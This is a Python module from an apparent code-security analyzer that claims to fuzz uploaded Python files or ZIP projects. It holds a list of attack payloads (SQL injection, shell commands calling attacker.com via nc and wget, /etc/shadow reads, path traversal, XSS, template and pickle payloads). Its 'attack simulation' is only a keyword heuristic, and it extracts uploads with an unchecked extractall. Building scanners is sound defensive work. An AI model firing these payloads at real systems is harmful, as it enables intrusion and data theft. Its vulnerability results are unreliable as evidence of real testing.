# analyzer/fuzzing.py - FUZZING ENGINE WITH ZIP SUPPORT
import sys
import random
import string
import ast
import tempfile
import os
import zipfile
from typing import List, Dict, Tuple
import time
from pathlib import Path

def is_fuzzing_available():
    """Fuzzing luôn available"""
    return True


class AttackPayloadGenerator:
    """Generator tạo các payload tấn công thực tế"""
    
    def __init__(self):
        self.payloads = {
            "sql_injection": [
                "' OR '1'='1", "'; DROP TABLE users; --", "' UNION SELECT password FROM users--",
                "admin'--", "1' AND 1=1--", "' OR 1=1--", "\" OR \"1\"=\"1", "' OR 'x'='x",
            ],
            "command_injection": [
                "; ls -la", "| cat /etc/passwd", "&& whoami", "$(whoami)", "`cat /etc/shadow`",
                "; ping -c 10 attacker.com", "| nc attacker.com 4444", "&& wget http://malicious.com/shell.sh",
            ],
            "code_injection": [
                "__import__('os').system('whoami')", "eval('print(open(\"/etc/passwd\").read())')",
                "exec('import os; os.system(\"ls\")')", "compile('malicious_code', '<string>', 'exec')",
                "__import__('subprocess').call(['ls'])",
            ],
            "path_traversal": [
                "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            ],
            "xss_payloads": [
                "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')", "<svg onload=alert('XSS')>",
            ],
            "template_injection": [
                "{{7*7}}", "${7*7}", "{{config.items()}}", "{%print(open('/etc/passwd').read())%}",
            ],
            "deserialization": [
                "csubprocess\nsystem\n(S'ls'\ntR.", "O:8:\"stdClass\":0:{}",
            ],
        }
    
    def get_all_payloads(self) -> List[Tuple[str, str]]:
        """Lấy tất cả payloads với category"""
        all_payloads = []
        for category, payload_list in self.payloads.items():
            for payload in payload_list:
                all_payloads.append((category, payload))
        return all_payloads
    
    def get_random_payload(self) -> Tuple[str, str]:
        """Lấy random payload"""
        category = random.choice(list(self.payloads.keys()))
        payload = random.choice(self.payloads[category])
        return category, payload


class CodeFuzzer:
    """Fuzzer để test code của user với attack payloads"""
    
    def __init__(self, code: str, file_path: str = "user_code.py"):
        self.code = code
        self.file_path = file_path
        self.generator = AttackPayloadGenerator()
        self.vulnerabilities = []
        self.entry_points = []
        
        try:
            self.tree = ast.parse(code)
            self._find_entry_points()
        except SyntaxError:
            self.tree = None
    
    def _find_entry_points(self):
        """Tìm các điểm nhập của user input trong code"""
        for node in ast.walk(self.tree):
            if isinstance(node, ast.Call):
                func_name = self._get_func_name(node.func)
                
                if func_name in ["input", "raw_input"]:
                    self.entry_points.append({
                        "type": "direct_input", "function": func_name, "line": node.lineno,
                        "vulnerable_to": ["all"]
                    })
                elif "request." in func_name:
                    self.entry_points.append({
                        "type": "web_input", "function": func_name, "line": node.lineno,
                        "vulnerable_to": ["all"]
                    })
                elif func_name == "open":
                    self.entry_points.append({
                        "type": "file_operation", "function": "open", "line": node.lineno,
                        "vulnerable_to": ["path_traversal"]
                    })
                elif "execute" in func_name or "query" in func_name:
                    self.entry_points.append({
                        "type": "database", "function": func_name, "line": node.lineno,
                        "vulnerable_to": ["sql_injection"]
                    })
                elif func_name in ["os.system", "subprocess.run", "subprocess.Popen", "os.popen"]:
                    self.entry_points.append({
                        "type": "command_execution", "function": func_name, "line": node.lineno,
                        "vulnerable_to": ["command_injection"]
                    })
                elif func_name in ["eval", "exec", "compile"]:
                    self.entry_points.append({
                        "type": "code_execution", "function": func_name, "line": node.lineno,
                        "vulnerable_to": ["code_injection"]
                    })
                elif "pickle.loads" in func_name or "yaml.load" in func_name:
                    self.entry_points.append({
                        "type": "deserialization", "function": func_name, "line": node.lineno,
                        "vulnerable_to": ["deserialization"]
                    })
    
    def _get_func_name(self, node):
        """Lấy tên function từ AST node"""
        if isinstance(node, ast.Name):
            return node.id
        elif isinstance(node, ast.Attribute):
            parts = []
            current = node
            while isinstance(current, ast.Attribute):
                parts.append(current.attr)
                current = current.value
            if isinstance(current, ast.Name):
                parts.append(current.id)
            return '.'.join(reversed(parts))
        return ""
    
    def fuzz_test(self, iterations: int = 100) -> Dict:
        """Chạy fuzz test với attack payloads"""
        results = {
            "file": self.file_path,
            "total_tests": 0,
            "vulnerabilities_found": [],
            "entry_points": len(self.entry_points),
            "payload_coverage": {},
            "risk_score": 0
        }
        
        if not self.entry_points:
            return {
                **results,
                "message": f"No entry points in {self.file_path}"
            }
        
        all_payloads = self.generator.get_all_payloads()
        
        for entry_point in self.entry_points:
            relevant_payloads = [
                (cat, payload) for cat, payload in all_payloads
                if "all" in entry_point["vulnerable_to"] or cat in entry_point["vulnerable_to"]
            ]
            
            test_payloads = random.sample(
                relevant_payloads, 
                min(iterations // len(self.entry_points), len(relevant_payloads))
            )
            
            for category, payload in test_payloads:
                results["total_tests"] += 1
                vulnerability = self._simulate_attack(entry_point, category, payload)
                
                if vulnerability:
                    vulnerability["file"] = self.file_path
                    results["vulnerabilities_found"].append(vulnerability)
                    
                    if category not in results["payload_coverage"]:
                        results["payload_coverage"][category] = 0
                    results["payload_coverage"][category] += 1
        
        results["risk_score"] = self._calculate_risk_score(results)
        return results
    
    def _simulate_attack(self, entry_point, attack_category, payload):
        """Simulate attack và phát hiện vulnerability"""
        has_validation = self._check_validation_nearby(entry_point["line"])
        
        if not has_validation:
            severity = self._get_severity(entry_point["type"], attack_category)
            return {
                "entry_point": entry_point["function"],
                "line": entry_point["line"],
                "attack_type": attack_category,
                "payload": payload[:50] + "..." if len(payload) > 50 else payload,
                "severity": severity,
                "vulnerable": True,
                "reason": f"No input validation for {entry_point['function']}",
                "recommendation": self._get_recommendation(entry_point["type"], attack_category)
            }
        return None
    
    def _check_validation_nearby(self, line_num):
        """Kiểm tra có validation gần entry point không"""
        validation_keywords = [
            "validate", "sanitize", "escape", "filter", "clean",
            "isinstance", "type", "len(", "max", "min",
            "re.match", "re.search", "whitelist", "blacklist"
        ]
        
        lines = self.code.split('\n')
        check_range = 5
        start = max(0, line_num - check_range)
        end = min(len(lines), line_num + check_range)
        
        for i in range(start, end):
            line = lines[i].lower()
            if any(keyword in line for keyword in validation_keywords):
                return True
        return False
    
    def _get_severity(self, entry_type, attack_category):
        """Xác định mức độ nghiêm trọng"""
        critical_combinations = [
            ("command_execution", "command_injection"),
            ("code_execution", "code_injection"),
            ("database", "sql_injection"),
        ]
        
        if (entry_type, attack_category) in critical_combinations:
            return "critical"
        if entry_type in ["command_execution", "code_execution"]:
            return "high"
        if attack_category in ["sql_injection", "command_injection", "code_injection"]:
            return "high"
        return "medium"
    
    def _get_recommendation(self, entry_type, attack_category):
        """Đưa ra khuyến nghị"""
        recommendations = {
            "sql_injection": "Use parameterized queries: cursor.execute('SELECT * WHERE id=?', (user_id,))",
            "command_injection": "Use subprocess with shell=False and list arguments",
            "code_injection": "NEVER use eval/exec with user input. Use ast.literal_eval()",
            "path_traversal": "Validate paths with os.path.abspath() and check prefix",
            "xss_payloads": "Escape HTML output. Use template engine with auto-escaping",
            "deserialization": "Use JSON instead of pickle. Use yaml.safe_load()",
        }
        return recommendations.get(attack_category, "Validate and sanitize all user input")
    
    def _calculate_risk_score(self, results):
        """Tính risk score từ 0-100"""
        if results["total_tests"] == 0:
            return 0
        
        vuln_count = len(results["vulnerabilities_found"])
        base_score = min(100, (vuln_count / results["total_tests"]) * 100)
        
        severity_weights = {"critical": 30, "high": 20, "medium": 10, "low": 5}
        severity_bonus = sum(
            severity_weights.get(v["severity"], 0) 
            for v in results["vulnerabilities_found"]
        )
        
        total_score = min(100, base_score + severity_bonus)
        return round(total_score)


class ProjectFuzzer:
    """Fuzzer cho toàn bộ project/ZIP"""
    
    def __init__(self, files: Dict[str, str]):
        """
        Args:
            files: Dict[filename, code_content]
        """
        self.files = files
        self.generator = AttackPayloadGenerator()
    
    def fuzz_project(self, iterations_per_file: int = 100, callback=None) -> Dict:
        """Fuzz toàn bộ project"""
        start_time = time.time()
        
        print(f"\n{'='*70}")
        print(f"🔥 FUZZING PROJECT - {len(self.files)} files")
        print(f"{'='*70}\n")
        
        project_results = {
            "total_files": len(self.files),
            "files_tested": 0,
            "total_tests": 0,
            "total_vulnerabilities": 0,
            "total_entry_points": 0,
            "file_results": {},
            "aggregate_risk_score": 0,
            "critical_files": [],
            "high_risk_files": []
        }
        
        current = 0
        total_iterations = len(self.files) * iterations_per_file
        
        for filename, code in self.files.items():
            if callback:
                callback(current, total_iterations, f"Testing {filename}...")
            
            print(f"[Testing] {filename}")
            
            try:
                fuzzer = CodeFuzzer(code, filename)
                file_results = fuzzer.fuzz_test(iterations_per_file)
                
                project_results["file_results"][filename] = file_results
                project_results["files_tested"] += 1
                project_results["total_tests"] += file_results["total_tests"]
                project_results["total_vulnerabilities"] += len(file_results["vulnerabilities_found"])
                project_results["total_entry_points"] += file_results["entry_points"]
                
                # Track high-risk files
                if file_results["risk_score"] >= 70:
                    project_results["critical_files"].append({
                        "file": filename,
                        "risk_score": file_results["risk_score"],
                        "vulnerabilities": len(file_results["vulnerabilities_found"])
                    })
                elif file_results["risk_score"] >= 40:
                    project_results["high_risk_files"].append({
                        "file": filename,
                        "risk_score": file_results["risk_score"],
                        "vulnerabilities": len(file_results["vulnerabilities_found"])
                    })
                
                current += iterations_per_file
                
            except Exception as e:
                print(f"[Error] {filename}: {str(e)}")
                continue
        
        # Calculate aggregate risk score
        if project_results["files_tested"] > 0:
            avg_risk = sum(
                r["risk_score"] for r in project_results["file_results"].values()
            ) / project_results["files_tested"]
            
            # Weighted by number of vulnerabilities
            vuln_weight = min(50, project_results["total_vulnerabilities"] * 2)
            project_results["aggregate_risk_score"] = round(min(100, avg_risk + vuln_weight))
        
        elapsed = time.time() - start_time
        
        print(f"\n{'='*70}")
        print(f"📊 PROJECT FUZZING RESULTS")
        print(f"{'='*70}")
        print(f"Files Tested: {project_results['files_tested']}/{project_results['total_files']}")
        print(f"Total Tests: {project_results['total_tests']}")
        print(f"Total Vulnerabilities: {project_results['total_vulnerabilities']}")
        print(f"Entry Points: {project_results['total_entry_points']}")
        print(f"Aggregate Risk Score: {project_results['aggregate_risk_score']}/100")
        print(f"Time: {elapsed:.2f}s")
        print(f"{'='*70}\n")
        
        if callback:
            callback(total_iterations, total_iterations, "Fuzzing complete!")
        
        return project_results


def fuzz_user_code(code: str, iterations: int = 100, callback=None):
    """Fuzzing single code"""
    fuzzer = CodeFuzzer(code)
    
    if callback:
        callback(0, iterations, "Starting fuzzing...")
    
    results = fuzzer.fuzz_test(iterations)
    
    if callback:
        callback(iterations, iterations, "Fuzzing complete!")
    
    return results


def fuzz_zip_file(zip_path: str, iterations_per_file: int = 100, callback=None):
    """
    Fuzzing toàn bộ ZIP file
    
    Args:
        zip_path: Path đến file ZIP
        iterations_per_file: Số test cho mỗi file
        callback: Progress callback
    
    Returns:
        Dict với kết quả fuzzing toàn project
    """
    temp_dir = tempfile.mkdtemp()
    files_to_fuzz = {}
    
    try:
        # Extract ZIP
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(temp_dir)
        
        # Tìm tất cả file .py
        for root, dirs, files in os.walk(temp_dir):
            for file in files:
                if file.endswith('.py'):
                    file_path = os.path.join(root, file)
                    rel_path = os.path.relpath(file_path, temp_dir)
                    
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            code = f.read()
                            files_to_fuzz[rel_path] = code
                    except Exception as e:
                        print(f"[Error reading] {rel_path}: {e}")
        
        if not files_to_fuzz:
            return {
                "error": "No Python files found in ZIP",
                "total_files": 0
            }
        
        # Fuzz toàn bộ project
        fuzzer = ProjectFuzzer(files_to_fuzz)
        results = fuzzer.fuzz_project(iterations_per_file, callback)
        
        return results
        
    finally:
        # Cleanup
        import shutil
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)


def fuzz_uploaded_file(file_path: str, iterations: int = 100, callback=None):
    """
    Fuzzing file upload (single .py hoặc .zip)
    
    Args:
        file_path: Path đến file upload
        iterations: Số test
        callback: Progress callback
    
    Returns:
        Dict với kết quả fuzzing
    """
    if file_path.endswith('.zip'):
        return fuzz_zip_file(file_path, iterations, callback)
    elif file_path.endswith('.py'):
        with open(file_path, 'r', encoding='utf-8') as f:
            code = f.read()
        return fuzz_user_code(code, iterations, callback)
    else:
        return {"error": "Only .py and .zip files are supported"}


if __name__ == "__main__":
    # Test
    test_code = """
import os

def login(username, password):
    query = f"SELECT * FROM users WHERE username='{username}'"
    cursor.execute(query)

def run_cmd():
    cmd = input("Command: ")
    os.system(cmd)
"""
    
    print("Testing fuzzer...")
    results = fuzz_user_code(test_code, iterations=50)
    print(f"Found {len(results['vulnerabilities_found'])} vulnerabilities")
    print(f"Risk Score: {results['risk_score']}/100")